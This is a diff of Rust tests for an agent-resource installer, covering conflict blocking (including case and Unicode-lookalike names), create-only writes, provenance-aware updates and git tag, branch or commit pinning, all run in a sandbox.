+            manifest.agents = vec![resource("codex-reviewer-openai", "agent.md")];
+            let server = plant("mcp_servers", "automatic", r#"{"command":"automatic"}"#);
+            let overrides = vec![
+                "skill:automatic".to_string(),
+                "mcp_server:automatic".to_string(),
+                format!("rule:{}", crate::core::rules::MANDATORY_RULE),
+                "agent:codex-reviewer-openai".to_string(),
+            ];
+
+            let result = install_source(REPO, &manifest, None, None, &overrides).expect("install");
+
+            assert_eq!(keys_of(&result.conflicts), sorted(overrides.clone()));
+            for conflict in &result.conflicts {
+                assert!(conflict.blocked, "{:?}", conflict);
+            }
+            let labels: HashMap<String, String> = result
+                .conflicts
+                .iter()
+                .map(|c| (c.key(), c.existing_source.clone()))
+                .collect();
+            assert_eq!(labels["mcp_server:automatic"], "built-in");
+            assert_eq!(labels["skill:automatic"], "built-in");
+            assert_eq!(labels["agent:codex-reviewer-openai"], "codex");
+            assert!(result.installed.is_empty());
+            assert_eq!(
+                fs::read_to_string(&server).expect("read server"),
+                r#"{"command":"automatic"}"#
+            );
+        });
+    }
+
+    #[test]
+    fn a_name_that_differs_only_in_case_or_form_is_blocked() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-case");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            manifest.mcp_servers = vec![resource("Vel385-GitHub", "server.json")];
+            // `ſ` (U+017F) folds onto `s` under NFKC, and APFS opens it as `s`.
+            manifest.rules = vec![resource("vel385-poſtgres", "rule.md")];
+            let planted = vec![
+                (
+                    plant("mcp_servers", "vel385-github", r#"{"command":"mine"}"#),
+                    r#"{"command":"mine"}"#.to_string(),
+                ),
+                (
+                    plant(
+                        "rules",
+                        "vel385-postgres",
+                        r#"{"name":"Mine","content":"Mine"}"#,
+                    ),
+                    r#"{"name":"Mine","content":"Mine"}"#.to_string(),
+                ),
+            ];
+            // The source even owns the lowercase server: a case variant is
+            // still never written over.
+            record_provenance("mcp_server", "vel385-github", REPO).unwrap();
+            let overrides = vec![
+                "mcp_server:Vel385-GitHub".to_string(),
+                "rule:vel385-poſtgres".to_string(),
+            ];
+
+            let result = install_source(REPO, &manifest, None, None, &overrides).expect("install");
+
+            assert_eq!(keys_of(&result.conflicts), sorted(overrides));
+            let existing: Vec<(bool, String)> = result
+                .conflicts
+                .iter()
+                .map(|c| (c.blocked, c.existing_name.clone()))
+                .collect();
+            assert!(
+                existing.contains(&(true, "vel385-github".to_string())),
+                "{:?}",
+                existing
+            );
+            assert!(
+                existing.contains(&(true, "vel385-postgres".to_string())),
+                "{:?}",
+                existing
+            );
+            assert!(result.installed.is_empty());
+            assert_unchanged(&planted);
+        });
+    }
+
+    #[test]
+    fn a_create_only_write_never_replaces_an_existing_entry() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let library_kinds = ["mcp_servers", "rules", "templates", "commands", "agents"];
+            for ((kind, install, file_name, content), library_kind) in
+                FILE_INSTALLERS.into_iter().zip(library_kinds)
+            {
+                fs::write(sandbox.source.join(file_name), content).expect("write source file");
+                let name = format!("vel385-create-{}", library_kind);
+                let path = plant(library_kind, &name, "original");
+
+                let err = install(&sandbox.source, &resource(&name, file_name), false)
+                    .expect_err("an existing entry must not be replaced");
+
+                assert!(err.contains("already exists"), "{kind}: {err}");
+                assert_eq!(
+                    fs::read_to_string(&path).expect("read"),
+                    "original",
+                    "{kind}"
+                );
+            }
+
+            fs::create_dir_all(sandbox.source.join("probe")).expect("create skill");
+            fs::write(sandbox.source.join("probe/SKILL.md"), "# New\n").expect("write skill");
+            let path = plant("skills", "vel385-create-skill", "original");
+            let err = install_skill(
+                &sandbox.source,
+                &skill("vel385-create-skill", "probe"),
+                false,
+            )
+            .expect_err("an existing skill must not be replaced");
+            assert!(err.contains("already exists"), "{err}");
+            assert_eq!(
+                fs::read_to_string(path.join("SKILL.md")).expect("read"),
+                "original"
+            );
+        });
+    }
+
+    /// Point the manifest's skills at a `skill.json` in the clone of `REPO`.
+    fn move_skills_to_skill_json(manifest: &mut AutomaticManifest, names: &KindNames) {
+        let clone = source_clone_path(REPO).expect("clone path");
+        fs::write(
+            clone.join("skill.json"),
+            serde_json::json!({
+                "name": "toolkit", "version": "1.0.0", "description": "Test",
+                "skills": [{
+                    "name": names.skill,
+                    "path": format!("skills/{}", names.skill),
+                    "description": "A fixture skill",
+                }],
+            })
+            .to_string(),
+        )
+        .expect("write skill.json");
+        manifest.skills = Some(SkillsSection {
+            skill_json: Some("skill.json".to_string()),
+            entries: Vec::new(),
+        });
+    }
+
+    #[test]
+    fn the_conflict_check_and_an_install_see_the_skills_of_a_skill_json() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-sj");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            move_skills_to_skill_json(&mut manifest, &names);
+            let clone = source_clone_path(REPO).expect("clone path");
+            fs::write(
+                clone.join("automatic.json"),
+                serde_json::to_string(&manifest).expect("manifest json"),
+            )
+            .expect("write manifest");
+            let skill_path = plant("skills", &names.skill, "# Mine\n");
+
+            let resolved = resolve_manifest(&clone).expect("resolve");
+            let conflicts = check_conflicts(REPO, &resolved, None).expect("check");
+            assert_eq!(keys_of(&conflicts), vec![format!("skill:{}", names.skill)]);
+
+            fs::remove_dir_all(&skill_path).expect("remove the user's skill");
+            let result = install_source(REPO, &manifest, None, None, &[]).expect("install");
+            assert_eq!(
+                result.installed.get("skills"),
+                Some(&vec![names.skill.clone()])
+            );
+            assert!(library_path("skills", &names.skill)
+                .join("SKILL.md")
+                .exists());
+        });
+    }
+
+    // ── what an update may install or delete (VEL-385) ───────────────────────
+
+    /// Write `manifest` as the clone's automatic.json, as a pushed version.
+    fn publish(manifest: &AutomaticManifest) {
+        let clone = source_clone_path(REPO).expect("clone path");
+        fs::write(
+            clone.join("automatic.json"),
+            serde_json::to_string(manifest).expect("manifest json"),
+        )
+        .expect("write manifest");
+    }
+
+    #[test]
+    fn an_update_installs_nothing_the_source_did_not_install_before() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-upd-new");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            let selected = SelectedResources {
+                skills: vec![names.skill.clone()],
+                rules: vec![names.rule.clone()],
+                ..Default::default()
+            };
+            install_source(REPO, &manifest, Some(selected), None, &[]).expect("install");
+            // The new version adds a rule.
+            manifest
+                .rules
+                .push(resource("vel385-upd-new-added", "rule.md"));
+            publish(&manifest);
+            let old = get_source(REPO).expect("read").expect("registered");
+
+            let result = reinstall_source(REPO, &old).expect("update");
+
+            assert!(result.added.is_empty());
+            assert_eq!(result.updated.get("rules"), Some(&vec![names.rule.clone()]));
+            assert_eq!(
+                result.updated.get("skills"),
+                Some(&vec![names.skill.clone()])
+            );
+            assert_eq!(
+                result.new_available.get("rules"),
+                Some(&vec!["vel385-upd-new-added".to_string()])
+            );
+            assert_eq!(
+                result.new_available.get("mcp_servers"),
+                Some(&vec![names.mcp_server.clone()])
+            );
+            assert!(!library_path("rules", "vel385-upd-new-added").exists());
+            assert!(!library_path("mcp_servers", &names.mcp_server).exists());
+            assert_eq!(get_provenance("rule", "vel385-upd-new-added"), Ok(None));
+        });
+    }
+
+    #[test]
+    fn an_update_keeps_a_resource_whose_reinstall_fails() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-upd-fail");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
+            // The new version points the skill at a path outside the
+            // manifest's folder, which a monorepo manifest could do before
+            // such paths were refused.
+            manifest.skills = Some(SkillsSection {
+                skill_json: None,
+                entries: vec![skill(&names.skill, "../elsewhere/skill")],
+            });
+            publish(&manifest);
+            let old = get_source(REPO).expect("read").expect("registered");
+
+            let result = reinstall_source(REPO, &old).expect("update");
+
+            assert_eq!(result.removed, HashMap::new(), "{:?}", result);
+            assert!(
+                result
+                    .warnings
+                    .iter()
+                    .any(|w| w.starts_with(&format!("Failed to install skill '{}'", names.skill))),
+                "{:?}",
+                result.warnings
+            );
+            assert!(library_path("skills", &names.skill)
+                .join("SKILL.md")
+                .exists());
+            assert_eq!(
+                get_provenance("skill", &names.skill),
+                Ok(Some(REPO.to_string()))
+            );
+            let entry = get_source(REPO).expect("read").expect("registered");
+            assert!(entry.resources["skills"].contains(&names.skill));
+        });
+    }
+
+    #[test]
+    fn an_update_reinstalls_skills_listed_only_in_a_skill_json() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-upd-sj");
+            let mut manifest = write_every_kind(REPO, &names, MCP);
+            move_skills_to_skill_json(&mut manifest, &names);
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
+            publish(&manifest);
+            let skill_file = library_path("skills", &names.skill).join("SKILL.md");
+            fs::write(
+                source_clone_path(REPO)
+                    .expect("clone path")
+                    .join("skills")
+                    .join(&names.skill)
+                    .join("SKILL.md"),
+                "---\nname: fixture\ndescription: A fixture skill\n---\n# Version two\n",
+            )
+            .expect("write new skill");
+            let old = get_source(REPO).expect("read").expect("registered");
+
+            let result = reinstall_source(REPO, &old).expect("update");
+
+            assert_eq!(
+                result.updated.get("skills"),
+                Some(&vec![names.skill.clone()])
+            );
+            assert_eq!(result.removed, HashMap::new());
+            assert!(fs::read_to_string(skill_file)
+                .expect("read")
+                .contains("# Version two"));
+        });
+    }
+
+    #[test]
+    fn an_update_leaves_a_resource_the_user_saved_as_their_own() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-upd-user");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
+            release_ownership_on_user_save("rule", &names.rule).expect("release");
+            crate::core::save_rule(&names.rule, "Mine", "My own rule.\n").expect("save rule");
+
+            // A version that still lists the rule does not touch it.
+            publish(&manifest);
+            let old = get_source(REPO).expect("read").expect("registered");
+            let result = reinstall_source(REPO, &old).expect("update");
+            assert!(
+                !result.updated.contains_key("rules"),
+                "{:?}",
+                result.updated
+            );
+            assert!(
+                result.warnings.iter().any(|w| w.contains("no longer owns")),
+                "{:?}",
+                result.warnings
+            );
+            let raw = fs::read_to_string(library_path("rules", &names.rule)).expect("read");
+            assert!(raw.contains("My own rule."), "{}", raw);
+
+            // A version that drops the rule does not delete it.
+            publish(&AutomaticManifest {
+                rules: Vec::new(),
+                ..manifest.clone()
+            });
+            let old = get_source(REPO).expect("read").expect("registered");
+            let result = reinstall_source(REPO, &old).expect("update");
+            assert!(
+                !result.removed.contains_key("rules"),
+                "{:?}",
+                result.removed
+            );
+            assert!(
+                result.kept.contains(&format!("rules:{}", names.rule)),
+                "{:?}",
+                result
+            );
+            let raw = fs::read_to_string(library_path("rules", &names.rule)).expect("read");
+            assert!(raw.contains("My own rule."), "{}", raw);
+
+            // Nor does removing the source.
+            remove_source(REPO).expect("remove");
+            assert!(library_path("rules", &names.rule).exists());
+        });
+    }
+
+    #[test]
+    fn an_update_deletes_only_names_this_source_still_owns() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let names = KindNames::new("vel385-upd-owner");
+            let manifest = write_every_kind(REPO, &names, MCP);
+            install_source(REPO, &manifest, None, None, &[]).expect("install");
+            // Another source has taken the rule over since.
+            record_provenance("rule", &names.rule, OTHER_REPO).unwrap();
+            publish(&AutomaticManifest {
+                rules: Vec::new(),
+                commands: Vec::new(),
+                ..manifest.clone()
+            });
+            let old = get_source(REPO).expect("read").expect("registered");
+
+            let result = reinstall_source(REPO, &old).expect("update");
+
+            assert_eq!(
+                result.removed.get("commands"),
+                Some(&vec![names.command.clone()])
+            );
+            assert!(
+                !result.removed.contains_key("rules"),
+                "{:?}",
+                result.removed
+            );
+            assert!(library_path("rules", &names.rule).exists());
+            assert!(!library_path("commands", &names.command).exists());
+            assert_eq!(
+                get_provenance("rule", &names.rule),
+                Ok(Some(OTHER_REPO.to_string()))
+            );
+        });
+    }
+
+    #[test]
+    fn a_user_save_release_clears_only_that_name() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            record_provenance("rule", "vel385-mine", REPO).unwrap();
+            record_provenance("rule", "vel385-theirs", REPO).unwrap();
+
+            release_ownership_on_user_save("rule", "vel385-mine").expect("release");
+            release_ownership_on_user_save("rule", "vel385-never-owned").expect("no-op");
+
+            assert_eq!(get_provenance("rule", "vel385-mine"), Ok(None));
+            assert_eq!(
+                get_provenance("rule", "vel385-theirs"),
+                Ok(Some(REPO.to_string()))
+            );
+        });
+    }
+
+    // ── the pin an install records (VEL-385) ─────────────────────────────────
+
+    const PIN_REPO: &str = "vel385-pins/toolkit";
+
+    fn git(dir: &Path, args: &[&str]) -> String {
+        let output = std::process::Command::new("git")
+            .args(["-c", "user.name=Test", "-c", "user.email=test@example.com"])
+            .args(["-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false"])
+            .args(args)
+            .current_dir(dir)
+            .output()
+            .expect("run git");
+        assert!(
+            output.status.success(),
+            "git {:?}: {}",
+            args,
+            String::from_utf8_lossy(&output.stderr)
+        );
+        String::from_utf8_lossy(&output.stdout).trim().to_string()
+    }
+
+    /// Make a repository for `PIN_REPO` below `sandbox.outside`, with one
+    /// rule whose content is `content`, and clone sources from there.
+    fn make_origin(sandbox: &Sandbox, content: &str) -> PathBuf {
+        let origin = sandbox.outside.join(PIN_REPO);
+        fs::create_dir_all(&origin).expect("create origin");
+        git(&origin, &["init", "-q", "-b", "main"]);
+        let manifest = AutomaticManifest {
+            name: "pins".to_string(),
+            version: "1.0.0".to_string(),
+            description: "Test".to_string(),
+            rules: vec![resource("vel385-pin-rule", "rule.md")],
+            ..Default::default()
+        };
+        fs::write(
+            origin.join("automatic.json"),
+            serde_json::to_string(&manifest).expect("manifest json"),
+        )
+        .expect("write manifest");
+        commit_rule(&origin, content);
+        set_source_url_base(Some(format!("file://{}", sandbox.outside.display())));
+        origin
+    }
+
+    fn commit_rule(origin: &Path, content: &str) {
+        fs::write(origin.join("rule.md"), content).expect("write rule");
+        git(origin, &["add", "-A"]);
+        git(origin, &["commit", "-q", "-m", content]);
+    }
+
+    fn installed_rule() -> String {
+        fs::read_to_string(library_path("rules", "vel385-pin-rule")).expect("read rule")
+    }
+
+    fn fetch_and_install(pin: Option<PinningConfig>) -> RemoteSource {
+        let manifest = fetch_source_manifest(PIN_REPO, pin, None).expect("fetch");
+        let result = install_source(PIN_REPO, &manifest, None, None, &[]).expect("install");
+        assert!(
+            result.skipped.is_empty() && result.conflicts.is_empty(),
+            "{:?}",
+            result
+        );
+        get_source(PIN_REPO).expect("read").expect("registered")
+    }
+
+    #[test]
+    fn a_full_sha_is_fetched_as_a_commit_and_anything_else_by_name() {
+        let sha = "0123456789abcdef0123456789abcdef01234567";
+        assert_eq!(pin_for_ref(sha).strategy, "commit");
+        assert_eq!(pin_for_ref("v1.0").strategy, "tag");
+        assert_eq!(pin_for_ref("develop").strategy, "tag");
+        assert_eq!(pin_for_ref("0123abc").strategy, "tag");
+    }
+
+    #[test]
+    fn an_install_at_a_tag_records_the_tag_and_an_update_stays_on_it() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let origin = make_origin(&sandbox, "# One\n");
+            git(&origin, &["tag", "v1.0"]);
+            commit_rule(&origin, "# Two\n");
+
+            let source = fetch_and_install(Some(pin_for_ref("v1.0")));
+
+            assert_eq!(
+                source.pin,
+                PinningConfig {
+                    strategy: "tag".to_string(),
+                    git_ref: "v1.0".to_string()
+                }
+            );
+            assert!(installed_rule().contains("# One"));
+
+            commit_rule(&origin, "# Three\n");
+            let result = update_source(PIN_REPO).expect("update");
+            assert_eq!(
+                result.updated.get("rules"),
+                Some(&vec!["vel385-pin-rule".to_string()])
+            );
+            assert!(installed_rule().contains("# One"), "{}", installed_rule());
+            let source = get_source(PIN_REPO).expect("read").expect("registered");
+            assert_eq!(source.pin.strategy, "tag");
+            set_source_url_base(None);
+        });
+    }
+
+    #[test]
+    fn an_install_from_a_branch_records_it_and_an_update_follows_it() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let origin = make_origin(&sandbox, "# One\n");
+
+            let source = fetch_and_install(None);
+
+            assert_eq!(source.pin, PinningConfig::default());
+            commit_rule(&origin, "# Two\n");
+            update_source(PIN_REPO).expect("update");
+            assert!(installed_rule().contains("# Two"), "{}", installed_rule());
+            set_source_url_base(None);
+        });
+    }
+
+    #[test]
+    fn an_install_at_a_commit_records_the_commit_and_an_update_stays_on_it() {
+        let sandbox = sandbox();
+        crate::core::paths::with_test_home(sandbox.home.clone(), || {
+            let origin = make_origin(&sandbox, "# One\n");
+            let sha = git(&origin, &["rev-parse", "HEAD"]);
+
+            let source = fetch_and_install(Some(pin_for_ref(&sha)));
+
+            assert_eq!(
+                source.pin,
+                PinningConfig {
+                    strategy: "commit".to_string(),
+                    git_ref: sha.clone()
+                }
+            );
+            commit_rule(&origin, "# Two\n");
+            update_source(PIN_REPO).expect("update");
+            assert!(installed_rule().contains("# One"), "{}", installed_rule());
+            set_source_url_base(None);
         });
     }
 }
